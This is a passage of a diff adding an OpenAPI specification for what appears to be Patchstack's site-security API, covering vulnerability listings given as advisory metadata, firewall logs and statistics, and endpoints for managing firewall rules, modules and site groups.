this.', type: string, example: 'My researcher name' }, vpatch: { description: 'Firewall rule identifier. 0/-1 = non-existent', type: integer, example: 5555 }, disclosure_date: { description: 'Vulnerability disclosure date.', type: string, example: '2024-04-03 09:37:02' }, resolve_date: { description: 'Formatted date of when the vulnerability should be mitigated on the site.', type: string, example: '10 Apr, 2024' }, score: { description: 'CVSS score of vulnerability.', type: decimal, example: 9.9 }, unseen: { description: 'Whether or not this vulnerability was loaded through the App yet.', type: boolean, example: false }, vuln_url: { description: 'Full URL to the vulnerability.', type: string, example: 'https://patchstack.com/database/vulnerability/oxygen/wordpress-oxygen-plugin-4-8-1-auth-remote-code-execution-rce-vulnerability' } }
+                  type: object
+              example:
+                -
+                  site: 12345
+                  site_id: 12345
+                  url: 'https://wptest.com'
+                  cms: WordPress
+                  addon_protection: 0
+                  slug: wordpress-oxygen-plugin-4-8-1-auth-remote-code-execution-rce-vulnerability
+                  issue: 'Oxygen Builder'
+                  name: 'Oxygen Builder'
+                  vuln_type: 'Remote Code Execution (RCE)'
+                  affected_in: '<= 4.8.3'
+                  fixed_in: ''
+                  is_exploited: 0
+                  patch_priority: 2
+                  credit_name: Snicco
+                  vpatch: 9063
+                  disclosure_date: '2024-04-03 09:37:02'
+                  resolve_date: '10 Apr, 2024'
+                  score: 9.9
+                  unseen: false
+                  vuln_url: 'https://patchstack.com/database/vulnerability/oxygen/wordpress-oxygen-plugin-4-8-1-auth-remote-code-execution-rce-vulnerability'
+                -
+                  site: 12345
+                  site_id: 12345
+                  url: 'https://wptest.com'
+                  cms: WordPress
+                  addon_protection: 0
+                  slug: wordpress-svg-support-plugin-2-5-5-authenticated-author-cross-site-scripting-via-svg-vulnerability
+                  issue: 'SVG Support'
+                  name: 'SVG Support'
+                  vuln_type: 'Cross Site Scripting (XSS)'
+                  affected_in: '<= 2.5.5'
+                  fixed_in: ''
+                  is_exploited: 0
+                  patch_priority: 2
+                  credit_name: 'nathanial Lattimer (d0nut)'
+                  vpatch: 9063
+                  disclosure_date: '2024-04-03 09:37:02'
+                  resolve_date: '10 Apr, 2024'
+                  score: 9.9
+                  unseen: false
+                  vuln_url: 'https://patchstack.com/database/vulnerability/svg-support/wordpress-svg-support-plugin-2-5-5-authenticated-author-cross-site-scripting-via-svg-vulnerability'
+  '/dashboard/firewall/{days}':
+    get:
+      tags:
+        - Dashboard
+      summary: 'Get firewall statistics'
+      description: 'Pull firewall data for a specific amount of days.'
+      operationId: 7e7b40f7b236373909e5d8fdb8e6d9ae
+      parameters:
+        -
+          name: days
+          in: path
+          description: 'Number of days to go back for data fetching.'
+          required: true
+          example: 180
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { attacks: { description: 'Attacks blocked per day based on the date parameter.', type: array, items: { properties: { num: { description: 'Number of attacks blocked.', type: integer, example: 0 }, dateday: { description: 'Date of the attacks blocked.', type: string, example: '2024-10-19' } }, type: object } } }
+                  type: object
+              example:
+                attacks:
+                  - { num: 0, dateday: '2024-10-14' }
+                  - { num: 0, dateday: '2024-10-15' }
+                  - { num: 0, dateday: '2024-10-16' }
+                  - { num: 0, dateday: '2024-10-17' }
+                  - { num: 0, dateday: '2024-10-18' }
+                  - { num: 0, dateday: '2024-10-19' }
+                  - { num: 0, dateday: '2024-10-20' }
+                  - { num: 0, dateday: '2024-10-21' }
+                  - { num: 0, dateday: '2024-10-22' }
+  '/download/wordpress/{site}':
+    get:
+      tags:
+        - 'Plugin Download'
+      summary: 'Download WordPress plugin'
+      description: 'Download the WordPress plugin, with the API keys injected into the plugin.'
+      operationId: 54ec70b2b389dc50b18e4bcfeaf17aab
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          example: 1
+      responses:
+        '200':
+          description: 'File served as download.'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'Something went wrong.'
+  /firewall/statistics:
+    post:
+      tags:
+        - Firewall
+      summary: 'Get firewall statistics'
+      description: 'Get statistics data for the firewall page.'
+      operationId: edd0582b9e216543afc1ebe7c70f3526
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - date
+                - site_id
+              properties:
+                date:
+                  description: 'Number of days to go back for pulling up the statistics.'
+                  type: integer
+                  default: 30
+                site_id:
+                  description: 'If not 0, pulls the statistics for this particular site identifier.'
+                  type: integer
+                  default: 0
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { attacks: { description: 'Attacks blocked per day based on the date parameter.', properties: { num: { description: 'Number of attacks blocked.', type: integer, example: 0 }, dateday: { description: 'Date of the attacks blocked.', type: string, example: '2024-10-19' } }, type: object }, ips: { description: 'Top IP addresses that have been blocked.', type: array, items: { properties: { ip: { description: 'The IP address.', type: integer, example: 0 }, num: { description: 'Number of attacks blocked for this IP address.', type: integer, example: 20 }, cc: { description: 'Country code information of the IP address.', properties: { country: { description: 'The full name of the country.', type: string, example: 'United States' }, iso_code: { description: 'The ISO format of the country.', type: string, example: US } }, type: object } }, type: object } }, rules: { description: 'Top rules that have been triggered.', type: array, items: { properties: { description: { description: 'The description of the rule.', type: string, example: 'Access PHP files directly.' }, num: { description: 'Number of attacks blocked for this rule.', type: integer, example: 20 } }, type: object } } }
+                  type: object
+              example:
+                attacks:
+                  - { num: 5, dateday: '2024-10-26' }
+                  - { num: 15, dateday: '2024-10-27' }
+                ips:
+                  - { ip: 123.172.130.74, cc: { country: 'United States', iso_code: US }, num: 20 }
+                rules:
+                  - { num: 20, description: 'Access PHP files directly.' }
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'Invalid number of days supplied'
+  /firewall/logs:
+    post:
+      tags:
+        - Firewall
+      summary: 'Get firewall logs'
+      description: 'Get firewall logs of all sites of the user.'
+      operationId: 0bd64bca1163fa96744238be020268cd
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - page
+                - per_page
+              properties:
+                page:
+                  description: 'Current paginated page.'
+                  type: integer
+                  example: 1
+                per_page:
+                  description: 'Number of entries per page.'
+                  type: integer
+                  example: 25
+                search:
+                  description: 'If search_type is application, search site with this URL.'
+                  type: string
+                  example: ''
+                search_type:
+                  description: 'Search type to execute, for Application, this must be the site URL.'
+                  type: string
+                  enum: ['', Application]
+                  example: Application
+                site_id:
+                  description: 'Search the logs for the given site identifier.'
+                  type: integer
+                  default: 0
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { logs: { description: Logs, type: array, items: { properties: { fid: { description: 'Category of firewall rule, unused.', type: string, example: DT, deprecated: true }, method: { description: 'HTTP request method.', type: string, example: POST }, log_date: { description: 'Date of log entry.', type: string, example: '2024-01-09T13:39:27.000Z' }, ip: { description: 'IP address.', type: string, example: 123.123.123.123 }, request_uri: { description: 'Request URL that has been blocked.', type: string, example: /my-test-url }, action: { description: 'The action that occurred.', type: string, example: Block }, _id: { description: 'Unique identifier belonging to the blocked request.', type: string, example: RIZz7owB0f0X1K7vFWF }, rule_id: { description: 'Rule identifier of the blocked request.', type: integer, example: 9095 }, description: { description: 'Description of the firewall rule.', type: string, example: Unknown }, cc: { description: 'Country code information of the IP address.', properties: { country: { description: 'The full name of the country.', type: string, example: 'United States' }, iso_code: { description: 'The ISO format of the country.', type: string, example: US } }, type: object }, datetime: { description: 'Formatted time of log_date.', type: string, example: 'January 9th, 2024 · 13:39:27' }, siteid: { description: 'Unique site identifier of the site which blocked this request.', type: integer, example: 1 }, url: { description: 'The URL of the site.', type: string, example: 'https://test.com' }, cms: { description: 'CMS of the site.', type: string, example: WordPress }, module: { description: 'Module name, unused.', type: string, example: '', deprecated: true } }, type: object } }, total: { description: 'Total number of blocked requests with current filter.', type: integer, example: 1 } }
+                  type: object
+              example:
+                logs:
+                  - { fid: Unknown, method: POST, log_date: '2024-01-09T13:39:27.000Z', ip: 127.0.0.1, request_uri: /my-test-url, action: Block, _id: RIZz7owB0f0X1K7vFWF, rule_id: '9095', description: Unknown, cc: { country: Unknown, iso_code: Unknown }, datetime: 'January 9th, 2024 · 13:39:27', siteid: 1, url: 'https://test.com', cms: WordPress, module: '' }
+                total: 1
+  /firewall/sites:
+    get:
+      tags:
+        - Firewall
+      summary: 'Get sites firewall state'
+      description: 'Get all sites of the user with the firewall running (at some point).'
+      operationId: 30c46d91bdd79908191c43c8b82e17a0
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                description: 'Array of sites.'
+                type: array
+                items:
+                  properties: { id: { description: 'The unique identifier of the site.', type: integer, example: 1 }, url: { description: 'URL of the site.', type: string, example: 'https://test.com' } }
+                  type: object
+              example:
+                -
+                  id: 1
+                  url: 'https://test.com'
+  /firewall/rule/test:
+    post:
+      tags:
+        - Firewall
+      summary: 'Test firewall rule'
+      description: 'Test an existing or new firewall rule.'
+      operationId: cba1f541b084d72cbe6669c88ab14879
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              properties:
+                function:
+                  description: 'The JSON of the rule to test.'
+                  type: string
+                  default: '[{\"parameter\":\"server.HTTP_USER_AGENT\",\"match\":{\"type\":\"contains\",\"value\":\"ABadBot\"}}]'
+                request_json:
+                  description: 'The JSON of the request to test against.'
+                  type: string
+                  default: '{\"SERVER\":{\"HTTP_USER_AGENT\":\"FireFox123 ABadBot Edge\"},\"GET\":{\"id\":123},\"POST\":{\"id\":123}}'
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The firewall rule is valid. The return value of the firewall rule was: true'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'The firewall rule is invalid, please double check the JSON format and syntax.'
+  /firewall/rule/create:
+    post:
+      tags:
+        - Firewall
+      summary: 'Create firewall rule'
+      description: 'Create a new firewall rule.'
+      operationId: 2b7682c3ef5abf889480eb24ddfb0c30
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              properties:
+                title:
+                  description: 'Title of the rule.'
+                  type: string
+                  default: test
+                type:
+                  description: 'Type of action to perform upon a match.'
+                  type: string
+                  default: BLOCK
+                  enum: [BLOCK, REDIRECT, LOG, WHITELIST]
+                typeParams:
+                  description: 'If type property equals REDIRECT, specify redirect URL in this field.'
+                  type: string
+                  default: ''
+                isWhitelist:
+                  description: 'Whether or not this rule is a whitelist rule and not a firewall rule.'
+                  type: integer
+                  default: 0
+                method:
+                  description: 'HTTP request method to match against.'
+                  type: string
+                  default: ALL
+                  enum: [ALL, GET, POST]
+                rule_v2:
+                  description: 'The JSON rule format.'
+                  type: string
+                  default: '[{\"parameter\":\"server.HTTP_USER_AGENT\",\"match\":{\"type\":\"contains\",\"value\":\"ABadBot\"}}]'
+                rule_request:
+                  description: 'The JSON request format to test.'
+                  type: string
+                  default: '{\"SERVER\":{\"HTTP_USER_AGENT\":\"FireFox123 ABadBot Edge\"},\"GET\":{\"id\":123},\"POST\":{\"id\":123}}'
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { success: { description: Success, type: boolean, example: true }, id: { description: 'Unique identifier of the firewall rule.', type: integer, example: 1 } }
+                  type: object
+              example:
+                success: true
+                id: 1
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'The given regular expression is invalid, please double check.'
+  /firewall/group/create:
+    post:
+      tags:
+        - Firewall
+      summary: 'Creates website group'
+      description: 'Creates new website group.'
+      operationId: abdf9d054d0555751c7c3730fd51a368
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - title
+                - sites
+              properties:
+                title:
+                  description: 'Title of the website group.'
+                  type: string
+                  default: 'Rule test'
+                sites:
+                  description: 'Array of site identifiers attached to the group.'
+                  type: integer
+                  default: []
+                  example: [1]
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: true
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: true
+  /firewall/rules:
+    post:
+      tags:
+        - Firewall
+      summary: 'Get firewall rules'
+      description: 'Get the firewall rules created by the user with modules information.'
+      operationId: 49a2e81371b011c692938c836eaffda8
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - page
+                - search
+              properties:
+                page:
+                  description: 'Page number.'
+                  type: integer
+                  default: 1
+                search:
+                  description: 'Search in title of created rule.'
+                  type: string
+                  default: ''
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { total: { description: 'Total number of rules.', type: integer, example: 1 }, rules: { description: Rules, type: array, items: { properties: { id: { description: 'Unique identifier of the firewall rule.', type: integer, example: 71 }, title: { description: 'Title of the firewall rule.', type: string, example: 'My very own firewall rule.' }, site: { description: 'Array of site URLs to which the rule is directly attached.', type: list, example: ['https://test.com'] } }, type: object } } }
+                  type: object
+              example:
+                total: 1
+                rules:
+                  - { id: 71, title: 'My very own firewall rule.', site: ['https://test.com'] }
+  /firewall/rule/templates:
+    get:
+      tags:
+        - Firewall
+      summary: 'Get firewall rule templates'
+      description: 'Get all firewall rule templates.'
+      operationId: 95a57393cba243a191267de9d768148b
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { id: { description: 'Template name.', type: integer, example: 1 }, title: { description: 'Template title.', type: string, example: 'Whitelist IP addresses' }, fields: { description: Fields, type: array, items: { properties: { eval: { description: 'Eval string to execute.', type: string, example: 'JSON.stringify(value.split(\";\"))' }, title: { description: 'Title of field.', type: string, example: 'Enter IP addresses seperated by ;' }, placeholder: { description: 'Placeholder of field.', type: string, example: 'E.g. 192.168.1.1;33.44.55.66' } }, type: object } }, closure: { description: 'Closure to execute.', type: string, example: '' }, rule: { description: 'Rule of the template.', type: string, example: '[\n   {\n      \"parameter\":\"server.ip\",\n      \"match\":{\n         \"type\":\"in_array\",\n         \"value\":<field1>\n      }\n   }\n]' }, type: { description: 'The type of rule to create.', type: string, example: WHITELIST } }
+                  type: object
+              example:
+                -
+                  id: 1
+                  title: 'Whitelist IP addresses'
+                  fields: { eval: 'JSON.stringify(value.split(\";\"))', title: 'Enter IP addresses seperated by ;', placeholder: 'E.g. 192.168.1.1;33.44.55.66' }
+                  closure: ''
+                  rule: '[\n   {\n      \"parameter\":\"server.ip\",\n      \"match\":{\n         \"type\":\"in_array\",\n         \"value\":<field1>\n      }\n   }\n]'
+                  type: WHITELIST
+  '/firewall/rule/{id}':
+    get:
+      tags:
+        - Firewall
+      summary: 'Get firewall rule'
+      description: 'Get the information of an individual rule.'
+      operationId: 4038aea0b34de0134465c5a474e6d9f8
+      parameters:
+        -
+          name: id
+          in: null
+          description: 'Unique identifier of the rule.'
+          required: true
+          example: 71
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { id: { description: 'Unique identifier of the firewall rule.', type: integer, example: 71 }, title: { description: 'Title of the firewall rule.', type: string, example: 'My very own firewall rule.' }, type: { description: 'Type of action to perform upon a match.', type: string, enum: [BLOCK, REDIRECT, LOG, WHITELIST], example: BLOCK }, type_params: { description: 'If type property equals REDIRECT, specify redirect URL in this field.', type: string, example: '' }, is_whitelist: { description: 'Whether or not this rule is a whitelist rule and not a firewall rule.', type: integer, example: 0 }, method: { description: 'HTTP request method to match against.', type: string, enum: [ALL, GET, POST], example: ALL }, rule_v2: { description: 'The JSON rule format.', type: string, example: '[{\"parameter\":\"server.HTTP_USER_AGENT\",\"match\":{\"type\":\"contains\",\"value\":\"ABadBot\"}}]' }, user_id: { description: 'ID of the user that owns this rule.', type: integer, example: null }, auto_assign: { description: 'Whether or not to auto assign this rule to sites.', type: integer, example: 0 } }
+                  type: object
+              example:
+                id: 71
+                title: 'My very own firewall rule.'
+                rule_v2: '[{\"parameter\":\"server.HTTP_USER_AGENT\",\"match\":{\"type\":\"contains\",\"value\":\"ABadBot\"}}]'
+                type: BLOCK
+                type_params: null
+                is_whitelist: 0
+                user_id: 1
+                auto_assign: 1
+  '/firewall/{rule}/sites':
+    get:
+      tags:
+        - Firewall
+      summary: 'Get rule sites'
+      description: 'Given rule, determine which sites are and are not attached to it.'
+      operationId: 98a4630994f7fc82d447b80180f0268a
+      parameters:
+        -
+          name: rule
+          in: path
+          description: Rule.
+          required: true
+          example: 1
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { id: { description: 'Unique identifier of the site.', type: integer, example: 1 }, url: { description: 'URL of the site.', type: string, example: 'https://test.com' }, enabled: { description: 'Enabled on the site or not.', type: integer, example: false } }
+                  type: object
+              example:
+                -
+                  id: 1
+                  url: 'https://test.com'
+                  enabled: false
+  /firewall/modules:
+    get:
+      tags:
+        - Firewall
+      summary: 'Get modules'
+      description: 'Get the modules that are available globally and belong to the user.'
+      operationId: 252104264e3dc4c3cf428c964d1223e4
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { id: { description: 'Identifier of module.', type: integer, example: 1 }, title: { description: 'Title of module.', type: string, example: 'Basic (OWASP Top 10' }, user_id: { description: 'ID of the user who owns the module.', type: integer, example: null }, description: { description: 'Description of module.', type: string, example: 'Protects your site against OWASP Top 10 attacks' }, ip_count: { description: 'IP count, exclusive to IP module.', type: integer, example: null }, ruleCount: { description: 'Number of rule attached.', type: integer, example: 71 }, siteCount: { description: 'Number of sites attached.', type: integer, example: 0 }, auto_assign: { description: 'Whether or not to auto assign this module to sites.', type: integer, example: 0 }, cms_name: { description: 'Name of the CMS to which this module belongs to.', type: string, enum: [WordPress, Drupal, Joomla], example: WordPress } }
+                  type: object
+              example:
+                -
+                  id: 1
+                  title: 'Basic (OWASP Top 10'
+                  user_id: null
+                  description: 'Protects your site against OWASP Top 10 attacks'
+                  ip_count: null
+                  ruleCount: 71
+                  siteCount: 0
+                  auto_assign: 0
+                  cms_name: WordPress
+  '/firewall/module/{id}':
+    get:
+      tags:
+        - Firewall
+      summary: 'Get module rules'
+      description: 'Get the information of a module and its attached rules.'
+      operationId: 2666f22ef3b0e26e2b53c7a4ee716d37
+      parameters:
+        -
+          name: id
+          in: path
+          description: 'Module id.'
+          example: 2
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { id: { description: 'Identifier of module.', type: integer, example: 2 }, title: { description: 'Title of module.', type: string, example: 'WordPress Virtual Patches' }, created_at: { description: 'Creation time.', type: string, example: '2023-12-15T07:32:17.000000Z' }, deleted_at: { description: 'Deletion time.', type: string, example: null }, updated_at: { description: 'Updated time.', type: string, example: '2023-12-15T07:32:17.000000Z' }, user_id: { description: 'ID of user who owns this module.', type: integer, example: null }, description: { description: 'Description of module.', type: string, example: 'Protects from attacks on vulnerable WordPress core and plugins' }, ip_count: { description: 'IP count, exclusive to IP module.', type: integer, example: 0 }, all_rules: { description: 'All rules attached to the module.', type: list, example: [] } }
+                  type: object
+              example:
+                -
+                  id: 2
+                  title: 'WordPress Virtual Patches'
+                  created_at: '2023-12-15T07:32:17.000000Z'
+                  updated_at: '2023-12-15T07:32:17.000000Z'
+                  deleted_at: null
+                  user_id: null
+                  description: 'Protects from attacks on vulnerable WordPress core and plugins'
+                  ip_count: 0
+                  all_rules: []
+  '/firewall/module/{id}/sites':
+    get:
+      tags:
+        - Firewall
+      summary: 'Get module sites'
+      description: 'Given module, determine which sites are and are not attached to it.'
+      operationId: d5278491c1fdbf60fddb873b7c68c050
+      parameters:
+        -
+          name: id
+          in: path
+          description: 'Module id.'
+          example: 2
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { id: { description: 'Unique identifier of the site.', type: integer, example: 1 }, url: { description: 'URL of the site.', type: string, example: 'https://test.com' }, enabled: { description: 'Enabled on the site or not.', type: integer, example: false } }
+                  type: object
+              example:
+                -
+                  id: 1
+                  url: 'https://test.com'
+                  enabled: false
+  /firewall/group/available:
+    get:
+      tags:
+        - Firewall
+      summary: 'Get groups'
+      description: 'Get the available website groups with modules and sites.'
+      operationId: 5a70f0fddbaf3f2250e0572a36e82e1c
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { sites: { description: 'Array of sites.', type: array, items: { properties: { id: { description: 'Unique identifier of the site.', type: integer, example: 1 }, url: { description: 'URL of the site.', type: string, example: 'https://test.com' } }, type: object } }, modules: { description: 'Array of available modules.', type: array, items: { properties: { id: { description: 'Identifier of module.', type: integer, example: 2 }, title: { description: 'Title of module.', type: string, example: 'WordPress Virtual Patches' } }, type: object } } }
+                  type: object
+              example:
+                sites:
+                  id: 1
+                  url: 'https://test.com'
+                modules:
+                  - { id: 2, title: 'WordPress Virtual Patches' }
+  '/firewall/module/{id}/update':
+    post:
+      tags:
+        - Firewall
+      summary: 'Update module.'
+      description: 'Update a module.'
+      operationId: 3e531d79c22c7e15b221726f07ef19fd
+      parameters:
+        -
+          name: id
+          in: path
+          description: 'Module id.'
+          required: true
+          example: '1'
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - title
+                - rules
+              properties:
+                title:
+                  description: 'New title.'
+                  type: string
+                  default: 'Test module'
+                rules:
+                  description: 'Array of rules to attach to the module.'
+                  type: array
+                  items: { type: int }
+                  example: [383, 381, 178, 1]
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: true
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'Invalid rule specified.'
+  '/firewall/group/{id}/update':
+    post:
+      tags:
+        - Firewall
+      summary: 'Updated website group.'
+      description: 'Updated a website group.'
+      operationId: 367efb3557d9a1cb4ebae2c324a8fa91
+      parameters:
+        -
+          name: id
+          in: path
+          description: 'Group id.'
+          required: true
+          example: '1'
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - title
+                - sites
+                - modules
+              properties:
+                title:
+                  description: 'Title of the firewall group.'
+                  type: string
+                  default: 'Test module'
+                sites:
+                  description: 'Array of site identifiers to attach to the firewall group.'
+                  type: array
+                  items: { type: int }
+                  example: [1]
+                modules:
+                  description: 'Array of module identifiers to attach to the firewall group.'
+                  type: array
+                  items: { type: int }
+                  example: [383, 381, 178, 1]
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: true
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: error
+  '/firewall/rule/{id}/delete':
+    delete:
+      tags:
+        - Firewall
+      summary: 'Delete firewall rule'
+      description: 'Delete a rule.'
+      operationId: c2b78dc0dfb133d904fb01eb4c0ed0f0
+      parameters:
+        -
+          name: id
+          in: path
+          description: 'Rule identifier.'
+          required: true
+          example: '1'
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: true
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: error.
+  '/firewall/module/{id}/delete':
+    delete:
+      tags:
+        - Firewall
+      summary: 'Delete module'
+      description: 'Delete a module.'
+      operationId: fb557c0c78b2a15c1dc714b920923d10
+      parameters:
+        -
+          name: id
+          in: path
+          description: 'Module identifier.'
+          required: true
+          example: '1'
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: true
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: error.
+  '/firewall/group/{id}/delete':
+    delete:
+      tags:
+        - Firewall
+      summary: 'Delete website group'
+      description: 'Delete a website group.'
+      operationId: e81f98f1f246bd6c5c3e2671d568158e
+      parameters:
+        -
+          name: id
+          in: path
+          description: 'Group identifier.'
+          required: true
+          example: '1'
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: true
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: error
+  '/firewall/group/{id}/site/{site}/delete':
+    delete:
+      tags:
+        - Firewall
+      summary: 'Delete site from site group'
+      description: 'Delete a specific website from a specific site group.'
+      operationId: 7e5fe542fba0695ec2eeccd54af104b7
+      parameters:
+        -
+          name: id
+          in: path
+          description: 'Group id.'
+          required: true
+          example: '1'
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: '1'
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The site group relation has been deleted.'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'You are not the owner of this site group.'
+  '/firewall/group/{id}/site/{site}/update':
+    post:
+      tags:
+        - Firewall
+      summary: 'Update site groups'
+      description: 'Update the groups of a specific site.'
+      operationId: 26598a0cb64e1a78bdf7d7650abb4b51
+      parameters:
+        -
+          name: id
+          in: path
+          description: 'Group id.'
+          required: true
+          example: '1'
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: '1'
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - groups
+              properties:
+                groups:
+                  description: 'Array of group identifiers to attach to the site.'
+                  type: array
+                  items: { type: int }
+                  example: [383, 381, 178, 1]
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The site group relation has been updated.'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'You are not the owner of the given site groups.'
+  '/firewall/group/site/{site}/update/single':
+    post:
+      tags:
+        - Firewall
+      summary: 'Add site group to site'
+      description: 'Add a single group to a specific site.'
+      operationId: da094bd2f956cca83615ee3e1c53c6db
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: '1'
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - group_id
+              properties:
+                group_id:
+                  description: 'The group identifier for the group to add the site to.'
+                  type: integer
+                  example: 1
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The site group relation has been added.'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'You are not the owner of this site group.'
+  '/firewall/module/{module}/site/{site}/enable':
+    post:
+      tags:
+        - Firewall
+      summary: 'Enable module on site'
+      description: 'Enable a module on a site.'
+      operationId: 2500ab6c01c1181c03e6c72fb853ebd2
+      parameters:
+        -
+          name: module
+          in: path
+          description: 'Module id.'
+          required: true
+          example: '1'
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: '1'
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: true
+  '/firewall/module/{module}/site/{site}/disable':
+    post:
+      tags:
+        - Firewall
+      summary: 'Disable module on site'
+      description: 'Disable a module on a site.'
+      operationId: 0b03aa2cab3ad20e9e3d184d263eb5c0
+      parameters:
+        -
+          name: module
+          in: path
+          description: 'Module id.'
+          required: true
+          example: '1'
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: '1'
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: true
+  '/firewall/{rule}/site/{site}/enable':
+    post:
+      tags:
+        - Firewall
+      summary: 'Enable rule on site'
+      description: 'Enable a rule on a site.'
+      operationId: 5ec3a79a922065b0729d0f6252e1b8d8
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: '1'
+        -
+          name: rule
+          in: path
+          description: 'Rule id.'
+          required: true
+          example: '1'
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: true
+  '/firewall/{rule}/site/{site}/disable':
+    post:
+      tags:
+        - Firewall
+      summary: 'Disable rule on site'
+      description: 'Disable a rule on a site.'
+      operationId: 57004d641fd0a20e7b124494d6f57e73
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: '1'
+        -
+          name: rule
+          in: path
+          description: 'Rule id.'
+          required: true
+          example: '1'
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: true
+  '/firewall/{rule}/global/{state}':
+    post:
+      tags:
+        - Firewall
+      summary: 'Toggle rule on all sites'
+      description: 'Toggle a rule on all sites.'
+      operationId: fe7ae81fdeef7bb0141be890481cf78c
+      parameters:
+        -
+          name: rule
+          in: path
+          description: 'Rule id.'
+          required: true
+          example: '1'
+        -
+          name: state
+          in: path
+          description: 'State id.'
+          required: true
+          example: '1'
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The rule has been attached to all sites.'
+  '/firewall/{rule}/group/{group}/{state}':
+    post:
+      tags:
+        - Firewall
+      summary: 'Toggle rule on all sites of group'
+      description: 'Toggle a rule on all sites of a group.'
+      operationId: 4f885d7f5ca0ac99be76791d4dcef44b
+      parameters:
+        -
+          name: rule
+          in: path
+          description: 'Rule id.'
+          required: true
+          example: '1'
+        -
+          name: group
+          in: path
+          description: 'Group id.'
+          required: true
+          example: '1'
+        -
+          name: state
+          in: path
+          description: 'State; enable or disable.'
+          required: true
+          example: enable
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The rule has been attached to all sites.'
+  '/firewall/module/{module}/global/{state}':
+    post:
